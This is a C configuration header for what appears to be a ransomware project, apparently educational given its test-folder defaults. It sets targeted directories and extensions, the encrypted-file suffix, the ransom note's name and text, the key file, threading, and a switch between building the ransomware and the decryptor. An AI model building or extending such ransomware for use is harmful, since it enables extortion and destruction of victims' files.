#ifndef __DEFAULT_CONFIG__H__
#define __DEFAULT_CONFIG__H__

#ifndef BUILD_RANSOMWARE
#define BUILD_RANSOMWARE false              // A boolean value that determines whether the ransomware should be built or not. If `true`, the ransomware will be built, otherwise the decryptor will be built.
#endif

#ifndef DIRS_TO_SEARCH
#define DIRS_TO_SEARCH {"./test_folder/subfolder_A", "./test_folder/subfolder_B"}    // A list of directories to search for files to encrypt/decrypt. By default, the list contains only the `test_folder/subfolder_A` and `test_folder/subfolder_B` directory in the current working directory.
#endif

#ifndef FILES_EXTENSIONS
#define FILES_EXTENSIONS {".txt"}           // A list of file extensions to encrypt/decrypt. By default, the list contains only the `.txt` extension.
#endif

#ifndef ENCRYPTED_FILE_EXTENSION
#define ENCRYPTED_FILE_EXTENSION ".crypt"   // A string that specifies the extension to use for encrypted files. By default, the extension is set to `.crypt`.
#endif

#ifndef RAMSON_FILENAME
#define RAMSON_FILENAME "Message.txt"       // A string that specifies the name of the ransom note file that will be created after the files are encrypted. By default, the file is named `Message.txt`.
#endif

#ifndef RAMSON_FILE_CONTENT_1
#define RAMSON_FILE_CONTENT_1 "Your files have been encrypted." // A string that specifies the first line of the ransom note file.
#endif

#ifndef RAMSON_FILE_CONTENT_2
#define RAMSON_FILE_CONTENT_2 "You need it for decrypt the files"   // A string that specifies the second line of the ransom note file.
#endif

#ifndef DECRYPTOR_KEY_FILENAME
#define DECRYPTOR_KEY_FILENAME "key.txt"  // A string that specifies the name of the file that will contain the encrypted key and IV used for decryption. By default, the file is named `keys.txt`.
#endif

#ifndef NUM_THREADS_AUTO
#define NUM_THREADS_AUTO true               // A boolean value that determines whether the number of threads used for encryption/decryption should be automatically determined or not. If `true`, the number of threads will be determined automatically, otherwise it will be set to the value specified by `NUM_THREADS`.
#endif

#ifndef NUM_THREADS
#define NUM_THREADS 4                       // An integer value that specifies the number of threads to use for encryption if `NUM_THREADS_AUTO` is set to `false`. By default, the value is set to `4`.
#endif

#ifndef ENABLE_EXTENSION_FILTERING
#define ENABLE_EXTENSION_FILTERING true     // A boolean value that determines whether file extension filtering should be enabled or not. If `true`, only files with certain extensions will be encrypted, otherwise all files will be encrypted.
#endif

#ifndef VERBOSE
#define VERBOSE false                       // A boolean value that determines whether verbose output should be enabled or not. If `true`, the program will output additional information during execution, otherwise it will output only essential information.
#endif

#ifndef DEBUG
#define DEBUG false                         // A boolean value that determines whether debug mode should be enabled or not. If `true`, the program will output additional debug information during execution, otherwise it will not output any debug information.
#endif

#endif
